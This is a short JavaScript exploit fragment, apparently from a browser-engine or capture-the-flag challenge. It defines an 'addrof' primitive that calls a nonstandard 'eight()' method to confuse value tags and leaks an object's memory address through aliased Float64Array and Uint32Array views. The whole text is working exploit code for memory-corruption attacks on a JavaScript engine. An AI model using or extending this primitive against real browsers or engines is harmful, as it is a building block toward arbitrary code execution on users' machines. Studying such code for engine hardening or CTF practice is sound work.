let buff = new ArrayBuffer(1000);
let f64 = new Float64Array(buff);
let u32 = new Uint32Array(buff);

let addrof = function(obj){
    let o1 = {"int" : 1, "object" : obj};
    o1.eight();
    let o = {"val" : o1.int, "floattag" : 7};
    // shift the second value plane
    // suddenly, value of thing is now tagged with a float!
    o.eight();
    // translation
    f64[0] = o.val;
    // reshift to not corrupt pointers
    o1.eight();
    o.eight();
    // u32[1] = top bits
    // u32[0] = bottom bits
    // convert hex address to decimal number
    //return parseFloat(Number("0x" + u32[1].toString(16) + u32[0].toString(16)));
    return (u32[1] * (1 << 16) * (1 << 16)) + u32[0];
};
